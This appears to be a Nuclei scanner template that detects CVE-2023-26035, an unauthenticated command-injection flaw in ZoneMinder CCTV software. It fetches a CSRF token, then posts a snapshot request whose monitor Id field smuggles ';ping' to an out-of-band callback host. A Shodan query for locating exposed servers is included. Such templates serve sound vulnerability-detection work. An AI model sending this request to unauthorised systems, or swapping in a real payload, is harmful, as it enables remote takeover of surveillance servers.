flow: 'http(1);

  set("csrf_token", template["csrf_token"][0]);

  http(2);

  '
http:
- extractors:
  - group: 1
    internal: true
    name: csrf_token
    regex:
    - csrfMagicToken = \"(key:[a-f0-9]{40},\d+)
    type: regex
  raw:
  - 'GET /index.php HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - dsl:
    - contains(interactsh_protocol, "dns")
    type: dsl
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    view=snapshot&action=create&monitor_ids[0][Id]=;ping+{{interactsh-url}}&__csrf_magic={{csrf_token}}

    '
id: CVE-2023-26035
info:
  author: Unblvr1,whotwagner
  classification:
    cpe: cpe:2.3:a:zoneminder:zoneminder:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-26035
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.99611
    epss-score: 0.96802
  description: 'ZoneMinder is a free, open source Closed-circuit television software
    application for Linux which supports IP, USB and Analog cameras.Versions prior
    to 1.36.33 and 1.37.33 are vulnerable to Unauthenticated Remote Code Execution
    via Missing Authorization. There are no permissions check on the snapshot action,
    which expects an id to fetch an existing monitor but can be passed an object to
    create a new one instead. TriggerOn ends up calling shell_exec using the supplied
    Id.

    '
  metadata:
    max-request: 2
    product: zoneminder
    shodan-query: html:"ZM - Login"
    vendor: zoneminder
    verified: true
  name: ZoneMinder Snapshots - Command Injection
  reference:
  - https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/
  - https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-72rg-h4vf-29gr
  - https://packetstormsecurity.com/files/175675/ZoneMinder-Snapshots-Command-Injection.html
  - https://github.com/rvizx/CVE-2023-26035
  - https://nvd.nist.gov/vuln/detail/CVE-2023-26035
  remediation: This issue is fixed in This issue is fixed in versions 1.36.33 and
    1.37.33.
  severity: critical
  tags: cve,cve2023,rce,zoneminder,unauth,packetstorm
